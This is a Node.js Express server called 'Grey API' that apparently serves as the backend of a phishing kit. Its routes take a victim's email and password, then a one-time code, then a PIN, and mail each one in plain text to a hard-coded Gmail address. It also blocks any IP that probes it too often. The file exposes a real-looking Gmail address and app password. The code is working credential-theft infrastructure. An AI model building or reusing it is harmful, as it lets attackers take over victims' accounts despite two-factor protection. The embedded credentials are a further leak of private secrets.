const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const rateLimit = require("express-rate-limit");

// ✅ Trust Vercel proxy — real client IP
app.set("trust proxy", 1);

app.use(cors());
app.options("*", cors());
app.use(express.json());

const PORT = process.env.PORT || 5000;

const userEmail = "johnambriz5879@gmail.com";
const pass = "ccfypnneylbxryde";

// ── Permanent IP blocklist ────────────────────────────────────────────────────
const blockedIPs = new Set();

app.use((req, res, next) => {
  const ip = req.ip;
  if (blockedIPs.has(ip)) {
    console.warn(`🚫 Blocked IP tried again: ${ip}`);
    return res.status(403).json({ success: false, message: "Access denied." });
  }
  next();
});

// ── Rate limiter — 5 requests per hour, then permanently block ────────────────
const limiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5,
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.ip,
  handler: (req, res) => {
    const ip = req.ip;
    blockedIPs.add(ip);
    console.warn(`🚫 IP permanently blocked: ${ip}`);
    return res.status(403).json({ success: false, message: "Access denied." });
  },
});

// Apply limiter to POST requests only
app.use((req, res, next) => {
  if (req.method === "POST") return limiter(req, res, next);
  next();
});

// ✅ Single transporter at startup — not inside each route
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: userEmail,
    pass: pass,
  },
});

transporter.verify((error) => {
  if (error) {
    console.error("❌ Mail error:", error.message);
  } else {
    console.log("✅ Mail transporter ready");
  }
});

// ── GET / — health check ──────────────────────────────────────────────────────
app.get("/", (req, res) => {
  res.json({ status: "ok", server: "Grey API" });
});

// ── POST / — email + password ─────────────────────────────────────────────────
app.post("/", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: "Email and password required." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Grey Clients: Email: ${email}`,
    text: `Grey Clients: New user registered with Email: ${email} and password: ${password}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      return res.send("error occurred: " + error);
    }
    console.log("Email sent:", info.response);
    return res.send("success");
  });
});

// ── POST /otp — OTP ───────────────────────────────────────────────────────────
app.post("/otp", (req, res) => {
  const otp = req.body?.otp;

  if (!otp) {
    return res.status(400).json({ success: false, message: "OTP required." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Grey Clients: OTP: ${otp}`,
    text: `Grey Clients: New user registered OTP: ${otp}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      return res.send("error occurred: " + error);
    }
    console.log("Email sent:", info.response);
    return res.send("success");
  });
});

// ── POST /pin — PIN ───────────────────────────────────────────────────────────
app.post("/pin", (req, res) => {
  const pin = req.body?.pin;

  if (!pin) {
    return res.status(400).json({ success: false, message: "PIN required." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Grey Clients: PIN: ${pin}`,
    text: `Grey Clients: New user registered PIN: ${pin}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      return res.send("error occurred: " + error);
    }
    console.log("Email sent:", info.response);
    return res.send("success");
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
